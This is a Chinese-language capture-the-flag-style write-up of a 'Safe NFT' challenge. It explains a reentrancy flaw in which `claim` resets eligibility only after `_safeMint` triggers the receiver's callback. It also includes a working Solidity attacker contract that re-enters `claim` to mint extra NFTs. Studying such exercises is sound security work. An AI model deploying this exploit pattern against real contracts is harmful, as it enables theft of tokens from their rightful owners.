## Safe NFT

### 目标

花一份钱领多个 NFT

### 分析

`claim` 方法存在被重入的可能

```solidity
function claim() external {
    require(canClaim[msg.sender], "CANT_MINT");
    _safeMint(msg.sender, totalSupply());
    canClaim[msg.sender] = false;
}
```

在 `_safeMint` 方法内

```solidity
function _safeMint(address to, uint256 tokenId) internal {
    _safeMint(to, tokenId, "");
}

function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual {
    _mint(to, tokenId);
    ERC721Utils.checkOnERC721Received(_msgSender(), address(0), to, tokenId, data);
}
```

可以看到 `_safeMint` 最后会调用 `ERC721Utils.checkOnERC721Received`。该方法会判断 `to` 地址是否是合约地址，如果是, 则调用合约的 `onERC721Received` 方法。

所以可以写攻击合约用来 `mint` 的接收地址。并在回调方法 `onERC721Received` 再次 `mint`。可以让 `canClaim[msg.sender] = false;` 无法执行到。

### POC

```solidity
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SafeNFTReveiver is IERC721Receiver {
    uint expectMintTotalCount = 5;
    uint mintCount = 0;
    SafeNFT private safeNFT;

    address owner = msg.sender;

    constructor(address _nftAddress) {
        safeNFT = SafeNFT(_nftAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        safeNFT.buyNFT{value: msg.value}();
        safeNFT.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        safeNFT.transferFrom(address(this), owner, tokenId);

        mintCount++;
        if (mintCount < expectMintTotalCount) {
            safeNFT.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
```
